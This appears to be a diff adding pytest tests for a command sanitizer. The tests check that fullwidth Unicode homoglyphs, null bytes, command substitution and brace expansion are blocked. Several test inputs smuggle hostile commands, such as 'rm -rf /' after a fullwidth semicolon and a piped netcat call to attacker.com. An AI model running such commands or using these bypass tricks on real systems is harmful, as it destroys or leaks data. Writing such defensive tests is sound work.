@@ -505,6 +505,138 @@ class TestInputValidation:
             sanitizer.validate_integer_range(150, minimum=0, maximum=120, param_name="age")
 
 
+class TestCommandInjectionUnicodeHomoglyphs:
+    """Tests for Unicode homoglyph bypass prevention."""
+
+    def test_blocks_fullwidth_semicolon(self):
+        """U+FF1B (fullwidth semicolon) is normalized and blocked."""
+        sanitizer = ParameterSanitizer()
+        with pytest.raises(SecurityError, match="Dangerous character ';'"):
+            sanitizer.sanitize_command("ls\uff1b rm -rf /")
+
+    def test_blocks_fullwidth_pipe(self):
+        """U+FF5C (fullwidth vertical bar) is normalized and blocked."""
+        sanitizer = ParameterSanitizer()
+        with pytest.raises(SecurityError, match="Dangerous character '|'"):
+            sanitizer.sanitize_command("cat file\uff5c nc attacker.com 1234")
+
+    def test_blocks_fullwidth_ampersand(self):
+        """U+FF06 (fullwidth ampersand) is normalized and blocked."""
+        sanitizer = ParameterSanitizer()
+        with pytest.raises(SecurityError, match="Dangerous character '&'"):
+            sanitizer.sanitize_command("echo test\uff06 malicious")
+
+    def test_blocks_fullwidth_dollar(self):
+        """U+FF04 (fullwidth dollar sign) is normalized and blocked."""
+        sanitizer = ParameterSanitizer()
+        with pytest.raises(SecurityError, match="Dangerous character '\\$'"):
+            sanitizer.sanitize_command("echo \uff04(whoami)")
+
+    def test_blocks_fullwidth_backtick(self):
+        """U+FF40 (fullwidth grave accent) is normalized and blocked."""
+        sanitizer = ParameterSanitizer()
+        with pytest.raises(SecurityError, match="Dangerous character '`'"):
+            sanitizer.sanitize_command("echo \uff40whoami\uff40")
+
+    def test_blocks_fullwidth_greater_than(self):
+        """U+FF1E (fullwidth greater-than) is normalized and blocked."""
+        sanitizer = ParameterSanitizer()
+        with pytest.raises(SecurityError, match="Dangerous character '>'"):
+            sanitizer.sanitize_command("echo secret \uff1e /tmp/leak")
+
+    def test_blocks_fullwidth_less_than(self):
+        """U+FF1C (fullwidth less-than) is normalized and blocked."""
+        sanitizer = ParameterSanitizer()
+        with pytest.raises(SecurityError, match="Dangerous character '<'"):
+            sanitizer.sanitize_command("command \uff1c input")
+
+    def test_mixed_ascii_and_unicode_normalized(self):
+        """Mixed ASCII + Unicode homoglyphs are caught after normalization."""
+        sanitizer = ParameterSanitizer()
+        # Fullwidth semicolon between normal ASCII commands
+        with pytest.raises(SecurityError):
+            sanitizer.sanitize_command("safe_cmd\uff1b evil_cmd")
+
+    def test_safe_command_with_unicode_letters_passes(self):
+        """Commands with non-dangerous Unicode characters should pass."""
+        sanitizer = ParameterSanitizer()
+        # These Unicode chars don't normalize to dangerous ASCII
+        result = sanitizer.sanitize_command("echo hello")
+        assert result == "echo hello"
+
+
+class TestCommandInjectionNullBytes:
+    """Tests for null byte injection prevention."""
+
+    def test_blocks_null_byte_in_command(self):
+        """Null byte in command is blocked."""
+        sanitizer = ParameterSanitizer()
+        with pytest.raises(SecurityError, match="Null byte"):
+            sanitizer.sanitize_command("cmd\x00malicious")
+
+    def test_blocks_null_byte_at_start(self):
+        """Null byte at start of command is blocked."""
+        sanitizer = ParameterSanitizer()
+        with pytest.raises(SecurityError, match="Null byte"):
+            sanitizer.sanitize_command("\x00ls")
+
+    def test_blocks_null_byte_at_end(self):
+        """Null byte at end of command is blocked."""
+        sanitizer = ParameterSanitizer()
+        with pytest.raises(SecurityError, match="Null byte"):
+            sanitizer.sanitize_command("ls\x00")
+
+
+class TestCommandInjectionPatterns:
+    """Tests for command substitution and expansion patterns."""
+
+    def test_blocks_command_substitution_dollar_paren(self):
+        """$(cmd) command substitution is blocked."""
+        sanitizer = ParameterSanitizer()
+        with pytest.raises(SecurityError):
+            sanitizer.sanitize_command("ls $(whoami)")
+
+    def test_blocks_variable_expansion_dollar_brace(self):
+        """${var} variable expansion is blocked."""
+        sanitizer = ParameterSanitizer()
+        with pytest.raises(SecurityError):
+            sanitizer.sanitize_command("ls ${HOME}")
+
+    def test_blocks_brace_expansion(self):
+        """{a,b} brace expansion is blocked."""
+        sanitizer = ParameterSanitizer()
+        with pytest.raises(SecurityError):
+            sanitizer.sanitize_command("ls {a,b,c}")
+
+    def test_blocks_brace_range_expansion(self):
+        """{1..10} brace range expansion is blocked."""
+        sanitizer = ParameterSanitizer()
+        with pytest.raises(SecurityError):
+            sanitizer.sanitize_command("echo {1..10}")
+
+
+class TestCommandLengthEnforcement:
+    """Tests for command length limits."""
+
+    def test_blocks_command_exceeding_default_limit(self):
+        """Commands exceeding default max length are rejected."""
+        sanitizer = ParameterSanitizer()
+        with pytest.raises(ValueError, match="Command too long"):
+            sanitizer.sanitize_command("a" * 1001)
+
+    def test_blocks_command_exceeding_custom_limit(self):
+        """Commands exceeding custom max length are rejected."""
+        sanitizer = ParameterSanitizer()
+        with pytest.raises(ValueError, match="Command too long"):
+            sanitizer.sanitize_command("a" * 51, max_length=50)
+
+    def test_allows_command_within_limit(self):
+        """Commands within length limit pass."""
+        sanitizer = ParameterSanitizer()
+        result = sanitizer.sanitize_command("ls -la", max_length=100)
+        assert result == "ls -la"
+
+
 class TestSecurityErrorMessages:
     """Tests for security error message quality."""
 
